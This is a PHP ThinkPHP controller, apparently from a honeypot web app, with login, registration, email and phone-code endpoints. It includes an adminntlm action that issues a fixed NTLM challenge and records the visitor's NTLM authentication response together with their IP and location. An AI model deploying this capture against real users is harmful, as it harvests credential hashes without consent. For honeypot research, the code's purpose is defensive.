<?php

namespace app\controller;

use think\facade\View;
use app\BaseController;
use think\facade\Session;
use app\model\PotUsersPhone;
use app\model\Key;
use app\model\PotMail;
use app\model\PotUsers;
use app\model\PotNtlm;
use think\facade\Request;
use app\model\Sysinfo;

class Index extends BaseController
{
    public function index()
    {
        $keyinfo = Key::getrandomstr();
        View::assign('favicon', $keyinfo['favicon']);
        View::assign('title', $keyinfo['title']);
        View::assign('key1', $keyinfo['key1']);
        View::assign('key2', $keyinfo['key2']);
        View::assign('arr', Sysinfo::getlist());
        return View::fetch();
    }

    public function info()
    {
        if ($this->request->isJson()) {
            return;
        } else {
            View::assign('arr', Sysinfo::getlist()[2]);
            return View::fetch();
        }
    }

    public function login()
    {
        if (Session::has("users")) {
            return redirect('/index/admin');
        }
        if ($this->request->isJson()) {
            $post = $this->request->param();
            $rt = PotUsers::loginCheck($post);
            if ($rt['error'] == 0) {
                Session::set("users", $rt['user']);
                return json($rt);
            } else {
                return json($rt);
            }
        } else {
            return View::fetch();
        }
    }

    public function register()
    {
        if ($this->request->isJson()) {
            $post = $this->request->param();
            if (strlen($post['nickname']) < 4)
                return json(['error' => 1, "msg" => '用户名长度必须大于4']);
            if ($post['password'] !== $post['confirmPassword'])
                return json(['error' => 1, "msg" => '两次密码不一致']);
            if ($post['agreement'] !== 'on')
                return json(['error' => 1, "msg" => '请同意用户协议']);
            $list = PotUsers::loginregister($post);
            return json($list);
        } else {
            return View::fetch();
        };
    }

    public function adminntlm()
    {
        $auth = isset($_SERVER['HTTP_AUTHORIZATION']) ? $_SERVER['HTTP_AUTHORIZATION'] : null;
        if ($auth == null) {
            header("WWW-Authenticate: NTLM");
            return response('', 401);
        }
        if (strpos($auth, "NTLM ") === 0) {
            $msg = base64_decode(substr($auth, 5));
            if (ord($msg[8]) == 1) {
                header("WWW-Authenticate: NTLM TlRMTVNTUAACAAAAAAAAACgAAAABggAAAAICAgAAAAAAAAAAAAAAAA==");
                return response()->code(401);
            } elseif (ord($msg[8]) == 3) {
                $list = decodeNTLMSSPType3(substr($auth, 5));
                $list['date'] = gettime();
                $list['userip'] = get_client_ip();
                $list['useraddrip'] = getipaddr();
                $list['msg'] = substr($auth, 5);
                $data = new PotNtlm;
                $data->save($list);
            }
        }
        return redirect('/');
    }

    public function admin()
    {
        if (!Session::has("users")) {
            return redirect('/');
        } else {
            return View::fetch();
        }
    }

    public function sendemail()
    {
        if ($this->request->isJson()) {
            $post = $this->request->param();
            $list = PotMail::sendmail($post);
            return json($list);
        } else {
            return redirect('/');
        };
    }

    public function sendphone()
    {
        if (!Session::has("users")) {
            return redirect('/');
        }
        if ($this->request->isJson()) {
            $post = $this->request->param();
            $list = PotUsersPhone::sendphone($post);
            return json($list);
        } else {
            return redirect('/');
        };
    }

    public function submitphone()
    {
        if (!Session::has("users")) {
            return redirect('/');
        }
        if ($this->request->isJson()) {
            return ['error' => 1, "msg" => '请先获取验证码'];
        } else {
            return redirect('/');
        }
    }
}
